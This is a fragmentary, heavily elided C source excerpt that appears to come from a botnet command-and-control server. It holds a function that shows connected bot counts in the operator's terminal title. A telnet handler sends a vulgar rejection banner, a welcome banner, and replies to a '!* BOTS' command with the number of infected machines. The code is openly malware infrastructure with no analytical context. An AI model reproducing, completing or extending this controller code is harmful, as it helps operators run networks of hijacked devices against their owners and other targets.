...
void *titleWriter(void *sock) 
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0;Bots connected: %d | Homies connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock)
{
        ...
        if(send(thefd, "\x1b[32m*          GTFO MY NET BITCH :)       *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[32m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;
        fak:
        ...
        if(send(thefd, "\x1b[32m*****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*        Welcome To The World          *\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
	    ...
	    if(strstr(buf, "!* BOTS")) 
	    {  
		  sprintf(botnet, "Bots connected: %d | Homies connected: %d\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
                trim(buf);
